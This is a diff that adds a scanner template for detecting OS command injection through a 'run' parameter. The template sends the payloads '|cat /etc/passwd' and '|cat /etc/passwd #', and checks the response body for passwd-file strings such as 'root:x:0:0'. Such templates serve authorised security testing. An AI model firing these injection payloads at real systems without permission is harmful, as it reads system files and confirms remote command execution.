@@ -1,0 +1,25 @@
+id: cmdi-027
+name: 'OS command injection via run'
+severity: critical
+type: active
+tags:
+  - cmdi
+  - injection
+  - rce
+description: 'OS command runs via run'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      run:
+        - '|cat /etc/passwd'
+        - '|cat /etc/passwd #'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
+          - 'gid='
+          - 'root:x:0:0'
+          - 'bin/bash'
+          - 'www-data'
